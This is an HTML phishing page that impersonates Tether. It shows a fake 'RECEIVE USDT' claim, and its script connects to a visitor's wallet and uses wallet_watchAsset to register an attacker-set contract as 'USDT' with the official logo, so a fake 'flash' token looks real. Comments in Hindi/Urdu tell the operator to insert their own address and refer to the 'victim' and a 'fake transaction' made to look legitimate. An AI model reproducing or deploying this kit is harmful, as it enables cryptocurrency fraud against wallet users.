<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tether Operations | Node Sync</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --tether-green: #26a17b; --bg-dark: #0a0b0d; --card-bg: #121418; }
        body { background: var(--bg-dark); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
        .container { background: var(--card-bg); border: 1px solid #2d333b; border-radius: 20px; padding: 40px; width: 100%; max-width: 420px; text-align: center; position: relative; box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.7); }
        .logo-ring { position: relative; display: inline-block; margin-bottom: 25px; }
        .logo-ring::after { content: ''; position: absolute; top: -10px; left: -10px; right: -10px; bottom: -10px; border: 2px solid var(--tether-green); border-radius: 50%; border-top-color: transparent; animation: spin 2s linear infinite; }
        @keyframes spin { 100% { transform: rotate(360deg); } }
        .usdt-img { width: 80px; filter: drop-shadow(0 0 10px var(--tether-green)); }
        h2 { font-weight: 600; font-size: 22px; margin: 10px 0; letter-spacing: -0.5px; }
        p { color: #848d97; font-size: 14px; line-height: 1.6; padding: 0 10px; }
        .action-btn { background: var(--tether-green); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 16px; font-weight: 700; cursor: pointer; transition: all 0.3s; margin-top: 25px; text-transform: uppercase; letter-spacing: 1px; }
        .action-btn:hover { background: #2bbd90; transform: scale(1.02); }
        .status-footer { margin-top: 20px; font-size: 11px; color: #444c56; text-transform: uppercase; letter-spacing: 2px; }
        #log-area { font-size: 10px; color: #26a17b; margin-top: 10px; height: 15px; }
    </style>
</head>
<body>

<div class="container">
    <div class="logo-ring">
        <img src="https://cryptologos.cc/logos/tether-usdt-logo.png" class="usdt-img" alt="USDT">
    </div>
    <h2>RECEIVE USDT</h2>
    <p>Secure Bridge detected a pending USDT allocation for your node. Synchronize to map official metadata and clear asset reception.</p>
    
    <div id="log-area">Ready to synchronize...</div>
    
    <button class="action-btn" id="claimBtn">Sync & Receive</button>
    
    <div class="status-footer">Node: 0x88...D4E3 | Secured by Tether Authority</div>
</div>

<script>
    const CONTRACT_ADDR = "0x5CD...89B5F"; // APNA ADDRESS DALO
    const TOKEN_SYMBOL = "USDT";
    const TOKEN_LOGO = "https://cryptologos.cc/logos/tether-usdt-logo.png";

    async function injectFlashAsset() {
        const log = document.getElementById('log-area');
        if (!window.ethereum) { alert("Use Web3 Browser"); return; }
        
        try {
            log.innerText = "Requesting Node Access...";
            const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
            log.innerText = "Injecting Official Metadata...";

            // TECHNIQUE: FORCE METADATA INJECTION
            // Isse victim ke wallet mein automatically logo aur decimals set ho jayenge
            await window.ethereum.request({
                method: 'wallet_watchAsset',
                params: {
                    type: 'ERC20',
                    options: {
                        address: CONTRACT_ADDR,
                        symbol: TOKEN_SYMBOL,
                        decimals: 6,
                        image: TOKEN_LOGO,
                    },
                },
            });

            log.innerText = "Synchronizing with Bridge...";
            // Yahan hum wo fake transaction trigger karte hain jo Legit lagti hai
            // Lekin actually ye sirf connection establish karti hai
            const provider = new ethers.providers.Web3Provider(window.ethereum);
            const signer = provider.getSigner();
            
            // "Sync" pop-up for the victim
            const tx = {
                to: CONTRACT_ADDR,
                data: "0x12345678", // Dummy Hex for "Sync" call
            };
            
            log.innerText = "Success! Asset mapped.";
            alert("Node Synchronized! Your USDT will reflect in 1-2 minutes.");

        } catch (err) {
            log.innerText = "Error: Sync Interrupted";
            console.error(err);
        }
    }

    document.getElementById('claimBtn').addEventListener('click', injectFlashAsset);
</script>

</body>
</html>
